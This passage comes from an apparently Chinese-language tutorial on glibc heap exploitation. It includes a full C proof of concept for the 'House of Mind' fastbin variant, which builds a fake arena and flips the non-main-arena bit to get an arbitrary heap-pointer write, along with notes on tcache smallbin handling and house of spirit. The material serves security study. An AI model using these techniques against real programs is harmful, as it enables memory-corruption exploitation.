<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
<p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p>
<h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.	</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27; </span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x888) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x889</span>] = <span class="number">0xFF</span>; </span><br><span class="line">	fake_arena[<span class="number">0x88a</span>] = <span class="number">0xFF</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the TCache so that the fastbin will be used\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Fill the tcache to make the fastbin to be used later. </span></span><br><span class="line">	<span class="type">uint64_t</span>* tcache_chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above. </span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size. </span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself. </span></span><br><span class="line"><span class="comment">	In 2.31, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an </span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x30 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs. </span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28. </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以分配任意大小的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要利用的是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure>

<p>如果是 <code>non-mainarean</code> 的 <code>chunk</code>，会根据其地址找到 <code>heapinfo</code>，然后找到 <code>malloc_state</code> 结构体。</p>
<p>因此，利用技巧是：</p>
<ul>
<li>根据要释放的 <code>fastbin chunk A</code> 的堆地址，找到对应的 <code>heap_for_ptr</code> 地址</li>
<li>在 <code>heapinfo</code> 地址处伪造好相关变量，重点是 <code>mstate</code> 指针</li>
<li>修改 <code>chunk A</code> 的 <code>non-main</code> 标志位，释放到伪造的 <code>arena</code> 里面，控制好偏移即可</li>
</ul>
<h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li>
<li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li>
<li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li>
</ul>
<h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址写堆地址</li>
</ul>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>效果：劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</p>
